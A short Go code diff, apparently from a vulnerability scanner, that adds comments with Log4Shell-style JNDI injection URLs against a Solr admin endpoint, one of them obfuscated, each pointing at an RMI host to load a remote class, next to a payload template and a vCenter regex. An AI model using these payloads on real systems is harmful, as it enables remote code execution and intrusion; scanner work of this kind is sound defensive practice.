@@ -9,7 +9,10 @@ import (
 	"strings"
 )
 
+// https://github.com/u21h2/nacs
 // https://192.168.10.198/ui/#/login
+// http://127.0.0.1:8983/solr/admin/cores?action=(){:;}{$:;$}{jndi:rmi${{::-:}}}//docker.for.mac.localhost:1099/UpX34defineClass}
+// http://127.0.0.1:8983/solr/admin/cores?action=${jndi:${rmi://docker.for.mac.localhost:1099/UpX34defineClass}}
 var UrlPayload = []string{"/solr/admin/cores?action=${jndi:%s}"}
 
 var RegVCenter = regexp.MustCompile(`(http.*?\?SAMLRequest=)`)
